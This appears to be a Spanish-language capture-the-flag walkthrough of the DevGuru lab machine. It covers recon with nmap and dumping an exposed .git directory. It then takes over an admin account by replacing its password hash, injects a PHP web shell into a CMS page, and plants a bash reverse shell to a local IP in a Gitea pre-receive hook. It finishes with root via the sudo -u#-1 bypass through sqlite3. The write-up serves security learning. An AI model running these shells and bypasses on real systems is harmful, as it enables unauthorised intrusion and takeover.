## Summary

- IP -> Random 192.168.68.112
- Ports -> TCP (22,80,8585), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.6p1
    - 80 -> Apache httpd 2.4.29 -> Tenemos un Website.git
    - 8585 -> Gitea, paquete de Software para usar git

## Recon

❯ **nmap 192.168.68.0/24**
❯ **nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.68.112  -oG allPorts**
❯ **nmap -sCV -p22,80,8585 192.168.68.112 -oN targeted**

Vamos a agregar un dominio en el **/etc/hosts** -> 192.168.68.112 devguru.local

❯ **./gitdumper.sh ❮http://IP/.git/❯ Website/**
* gitdumper -> Ejecutar el comando
* IP -> Dominio a escanear 
* .git -> Queremos que todo lo que encuentre de git lo extraiga 
* Website -> Que todo lo que encuentre lo guarde en ese archivo llamado Website 

❯ **./extractor.sh ../Dumper/Website ./website**
* extractor -> Ejecutar el comando
* Dumper/Website -> Path de el comando anterior y el nombre del archivo que le habiamos puesto
* website -> Que lo que extraiga nos lo guarde en el archivo llamado website

Ahora nos dirijimos al website que esta dentro del extractor y nos muestra un directorio al cual accedemos y obtenemos lo siguiente 
* **adminer.php** -> Que esta corriendo un servicio php
* **config** -> Nos muestra un directorio llamado config

Miramos en la web ese directorio 
* http://devguru.local/adminer.php -> Encontramos una pagina de Login que nos pide ciertas cosas 
* **Ctrl + u** -> Para mirar el codigo de la pagina web 

Podemos inspeccionar el dir Config para ver si encontramos algo que nos pueda ayudar 
- Encontramos dentro de config un archivo que se llama **database.php** y ahi podemos observar que hay diferentes bases de datos con users y passwd, pero la que nos interesa es la de **mysql** ya que en la pagina web, ahi nos muestra que es ese tipo de base de datos 

Pudimos entrar en la pagina web en la parte de adminer con los datos que encontramos en la database anterior
Encontramos en la session de backend_users el usuario Frank y su passwd, pero esta passwd esta encriptada 

Por lo que hacemos lo siguiente 
\$2y\$  Esas 4 primeras letras de la passwd encryptada las podemos buscar en Google y asi saber que tipo de encriptacion es

❯  https://www.devglan.com/online-tools/aes-encryption-decryption Nos ayudara a encryptar con diferentes hashes
* Nos vamos a la session de **Online Bcrypt Hashing** y generamos este tipo de hash \$2y\$

Y con la nueva passwd le damos en editar y cambiar por la que hemos generado 

Una vez cambiada la passwd, para poder ingresar debemos de ir a la siguiente url
❯ http://devguru.local/backend
Y ahi nos abrira una nueva pagina en donde podremos colocar el usuario de Frank y la nueva passwd

Dentro de la pagina web podemos ir explorando y nos damos cuenta que hay **CMS** el cual es un administrador que tenemos en la pagina en el cual podemos ver que pagina podemos vulberar y obtener informacion sobre esa y encontramos la pagina de **Home** en la cual tenemos una terminal que dice **Code** y hi podriamos colocar comandos

Con este codigo le decimos a la pagina que queremos que cuando se ejecute comandos cmd los guarde en la variable, esto si estamos en un Framework
* **Code**
function onStart() {
	$this->page["myVar"] = shell_exec(\$\_GET['cmd']);
}

Y para hacerlo funcionar debemos de hacer lo siguiente en:
* **Markup**
{{this.page.myVar}}
Que eso es lo que va a recibir del condigo anterior
Ahora le damos en **Save** y despues en **Preview** y nos dara un error, pero ahi ya estar enyectado el comando y ahora en la url podremos ejecutar comandos

http://devguru/local/?cmd=ls -la -> Con esto nosotros podremos colocar comandos en la URL y asi podriamos hacer una revershell

Por lo que lo podemos hacer de dos formas, la primera es subiendo un archivo .php y que nos lo ejecute la url y la segunda manera es que coloquemos el comando en la url y lo podriamos encodear 




## User
Ingresamos como el usuario **www-data** por lo que tendriamos que ver la manera para cambiar de usuario

Tratamiento de la consola Linux cuando entras a una maquina victima
 ❯ **python3 -c ‘import pty;pty.spawn(“/bin/bash”)’** Para tener una mejor bash
 ❯ **Ctrl + z**
 ❯ **stty raw -echo; fg**
 ❯ **reset xterm**

Una vez teniendo la nueva consola interactiva, podemos ver lo que hay en el dir. Miramos que existe un dir llamado 'backups' en el cual nos podemos meter y encontraremos un archivo **app.init.bak** y su usuario es frank.
Por lo que podriamos usar ese archivo para ver si existe alguna passwd que nos pueda ayudar a cambiar de usuario 

❯ **cat app.init.bak** Miramos el contenido del archivo .bak 

Encontramos algunos datos que nos pueden ayudar como son los sig:
* url: devguru.local:8585
* user: gitea
* passwd: UfFPTF8C8jjxVF2m
Esto nos ayudaria a entrar a la base da datos de mysql y en la url de /adminer.php
Ahora buscando en la base de datos logramos encontrar al usuario Frank y su passwd pero su passwd esta encriptada, por lo que haremos lo mismo de antes y le cambiaremos la passwd colocando el mismo hash 

❯  https://www.devglan.com/online-tools/aes-encryption-decryption Nos ayudara a encryptar con diferentes hashes
* Nos vamos a la session de **Online Bcrypt Hashing** y generamos este tipo de hash \$2y\$ 

Por lo que al momento de cambiar la passwd, tambien debemos de cambiar el tipo de hash en la base de datos al sig:
* bcrypt
Una vez guardado los campos 

Nos dirijimos al sig url **devguru.local:8585** e ingresaremos con el usuario Frank y la nueva passwd, esto para vulnerar Gitea
Una vez dentro de la pagina web de Gitea, nos ponemos a buscar algo que nos pueda ayudar a hacer una ReverShell y eso lo encontraremos en la parte de 
* **Settings > Git hooks > pre-receive > edit**  

Editamos el archivo, borrando su contenido y ahi colocar una ReverShell, antes de darle Update, nos colocamos en escucha con Netcat
❯ **/bin/bash -i >& /dev/tcp/192.168.68.100/443 0>&1** 
* 192.168.68.100 -> Colocamos nuestra IP
* 443 -> Puerto de Netcat que utilizaremos 


❯ **nc -nlvp 443** Nos ponemos en escucha para recibir la ReverShell

Ahora para poder hacer que haga efecto en Gitea, debemos de actualizar un archivo, por lo que actualizaremos el README.txt para no ser detectados y esto lo haremos dandole en **edit**, le agregamos una linea y le damos en **Commit changes**


Despues de eso ya podriamos entrar con el usuario Frank y tendriamos una consola, por lo que vamos a su dir y buscamos la flag del user.txt


## Root
❯ **sudo -l** Para ver si tenemos privilegios en el Sudoers (l=ele) y tenemos el **/usr/bin/sqlite3**

Buscamos en Google en la pagina de **exploit-db.com** en la cual buscaremos **sudo** y buscariamos el exploit de **sudo 1.8.27 Security Bypass** en donde solo ocuparemos este comando del codigo para poderlos usar al momeno de ejecutar sqlite3

❯ **sudo -u#-1 /bin/bash** Tendremos que modificar este comando y usuarlo con sqlite3 de la siguiente manera

❯ **sudo -u#-1 sqlite3 /dev/null '.shell/bin/bash'** Asi tendriamos que ejecutar el comando para que nos de el usuario Root

Y ahora podemos acceder al dir Root y ver la flag root.txt


